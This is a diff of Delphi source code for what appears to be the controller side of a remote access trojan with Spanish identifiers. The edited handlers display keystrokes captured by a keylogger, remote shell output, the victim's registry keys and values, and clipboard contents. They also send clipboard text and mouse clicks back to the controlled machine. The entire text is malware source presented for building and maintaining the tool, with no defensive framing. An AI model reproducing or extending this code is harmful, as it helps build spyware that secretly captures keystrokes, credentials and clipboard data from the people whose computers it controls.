@@ -588,7 +588,7 @@ begin
           RichEditKeylogger.SelAttributes.Style := [];
           RichEditKeylogger.SelAttributes.Color := clBlack;
         end;
-      RichEditKeylogger.SelText := TempStr {+ #13+#10};
+      RichEditKeylogger.SelText := TempStr;
 
     end;
   RichEditKeylogger.SelText := Texto;
@@ -1230,15 +1230,6 @@ begin
   if Copy(Recibido, 1, 12) = 'LISTARCLAVES' then
     begin
       Delete(Recibido, 1, 13);
-      { if Pos('|', Recibido) > 1 then
-       begin
-         TempStr := Copy(recibido, 1, Pos('|', Recibido) - 1);
-         Delete(Recibido, 1, Pos('|', Recibido));
-       end;       }
-      { while length(Recibido) < StrToInt(TempStr) do
-       begin
-         Recibido := Recibido + Trim(Athread.Connection.ReadLn);
-       end;     }
       AniadirClavesARegistro(Recibido);
     end;
   if Copy(Recibido, 1, 13) = 'LISTARVALORES' then
@@ -1287,9 +1278,7 @@ begin
         end
       else
         begin
-          TempStr := StringReplace(Trim(Recibido), '|salto|', #10, [rfReplaceAll]);
-          TempStr := StringReplace((Tempstr), '|salto2|', #13, [rfReplaceAll]);
-          Memoshell.Lines.Append(Trim(Tempstr));
+          Memoshell.Lines.Append(Trim(Recibido));
           SendMessage(MemoShell.Handle, EM_LINESCROLL, 0, Length(Memoshell.Text));
         end;
     end;
@@ -1369,9 +1358,10 @@ begin
   if Copy(Recibido, 1, 13) = 'NEWKEYLOGKEYS' then
     begin
       Delete(Recibido, 1, Pos('|', Recibido));
-      Recibido := StringReplace((Recibido), '|salto|', #10, [rfReplaceAll]);
-      Recibido := StringReplace((Recibido), '|salto2|', #13, [rfReplaceAll]);
-      Recibido := StringReplace((Recibido), '|espacio|', ' ', [rfReplaceAll]);
+      Recibido := StringReplace((Recibido),'|salto|', #10, [rfReplaceAll]);
+      Recibido := StringReplace((Recibido),'|salto2|', #13, [rfReplaceAll]);
+      Recibido := StringReplace((Recibido),'|espacio|', ' ', [rfReplaceAll]);
+      
       RichEditKeylogger.SelStart := RichEditKeylogger.GetTextLen;
       AgregarARichEdit(Recibido);
     end;
@@ -1432,16 +1422,14 @@ begin
     begin
       Delete(Recibido, 1, Pos('|', Recibido));
       EditPathArchivos.Text := trim(Copy(Recibido, 1, Pos('|', Recibido) - 1));
-      BtnActualizarArchivos.Click;
+      Athread.Synchronize(BtnActualizarArchivos.Click);
     end;
 
   // Portapapeles!
   if Copy(Recibido, 1, 7) = 'GETCLIP' then
     begin
       Delete(Recibido, 1, 8);
-      TempStr := StringReplace(Trim(Recibido), '|salto|', #10, [rfReplaceAll]);
-      TempStr := StringReplace((Tempstr), '|salto2|', #13, [rfReplaceAll]);
-      MemoClipBoard.Text := TempStr;
+      MemoClipBoard.Text := Recibido;
       SpeedButtonClipBoard1.Enabled := True;
       Estado(_('Portapapeles recibido'));
     end;
@@ -1823,7 +1811,7 @@ procedure TFormControl.BtnEnviarBromasClick(Sender: TObject);
 var
   broma: string;
 begin
-  if Servidor.Connection.Connected then
+if Servidor.Connection.Connected then
     begin
       if ListViewBromas.Selected = nil then
         MessageDlg(_('Selecciona alguna broma'), mtWarning, [mbOK], 0)
@@ -2245,8 +2233,6 @@ begin
   //sobre una misma clave
   TreeViewRegedit.Items.beginupdate;
   TreeViewRegedit.Selected.DeleteChildren;
-  Claves := StringReplace(Claves, '|salto|', #10, [rfReplaceAll]);
-  Claves := StringReplace(Claves, '|salto2|', #13, [rfReplaceAll]);
 
   tmp := claves;
   Total := 0;
@@ -2281,8 +2267,6 @@ var
 begin
   ListViewRegistro.Clear;
   ListViewRegistro.Items.beginupdate;
-  Valores := StringReplace(Valores, '|salto|', #10, [rfReplaceAll]);
-  Valores := StringReplace(Valores, '|salto2|', #13, [rfReplaceAll]);
 
   while Pos('|', Valores) > 0 do
     begin
@@ -2619,15 +2603,11 @@ begin
       Y := (Y * AltoCap) div (imgCaptura.Height);
       if button = mbLeft then
         begin
-          //Señalar
-          Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKIZQ' + '|');
           //Hacer Click
           Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKIZQ' + '|');
         end
       else if button = mbRight then
         begin
-          //Señalar
-          Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKDER' + '|');
           //Hacer Click
           Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKDER' + '|');
         end;
@@ -4713,8 +4693,8 @@ begin
   if Servidor.Connection.Connected then
     begin
       TempStr := MemoClipBoard.Text;
-      TempStr := StringReplace(Trim(tempstr), #10, '|salto|', [rfReplaceAll]);
-      TempStr := StringReplace((Tempstr), #13, '|salto2|', [rfReplaceAll]);
+      TempStr := StringReplace(tempstr, #10, '|salto|', [rfReplaceAll]);
+      TempStr := StringReplace(Tempstr, #13, '|salto2|', [rfReplaceAll]);
       Servidor.Connection.Writeln('SETCLIP|' + TempStr);
     end
   else
